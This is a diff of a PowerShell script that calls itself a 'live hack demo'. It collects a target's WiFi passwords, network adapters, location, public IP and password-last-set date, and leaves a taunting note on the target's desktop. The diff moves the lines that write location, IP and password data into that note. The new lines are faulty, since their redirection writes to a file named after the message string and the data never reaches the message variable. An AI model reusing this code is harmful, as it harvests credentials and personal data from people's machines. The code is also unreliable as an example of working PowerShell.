@@ -242,10 +242,6 @@ Write-Host "Updating ..."
 	They will be save in the temp directory to a file named with "$env:USERNAME-$(get-date -f yyyy-MM-dd)_WiFi-PWD.txt"
 #>
 
-if ($GL) { Write-Host "`nYour Location: `n$GL" >> $env:USERNAME-$(get-date -f yyyy-MM-dd)_WiFi-PWD.txt }
-if ($PubIP) { Write-Host "`nYour Public IP: $PubIP" >> $env:USERNAME-$(get-date -f yyyy-MM-dd)_WiFi-PWD.txt }
-if ($pls) { Write-Host "`nPassword Last Set: $pls" >> $env:USERNAME-$(get-date -f yyyy-MM-dd)_WiFi-PWD.txt }
-
 Function Get-Networks {
 # Get Network Interfaces
 $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
@@ -683,7 +679,13 @@ $s.Speak($OUTRO)
 
 # this snippet will leave a message on your targets desktop 
 
-$message = "GM Chamber Live Hack Demo" + "\n\n Stay Protected!!" + "\n\n Stay Compliant!!" + "\n\n Stay Safe!!"
+$message = "GM Chamber Live Hack Demo"
+
+if ($GL) { Write-Host "`nYour Location: `n$GL" >> $message }
+if ($PubIP) { Write-Host "`nYour Public IP: $PubIP" >> $message }
+if ($pls) { Write-Host "`nPassword Last Set: $pls" >> $message }
+
+Write-Host "\n\n Stay Protected!!" + "\n\n Stay Compliant!!" + "\n\n Stay Safe!!" >> $message
 
 Add-Content $home\Desktop\WithLove.txt $message
 ###########################################################################################################
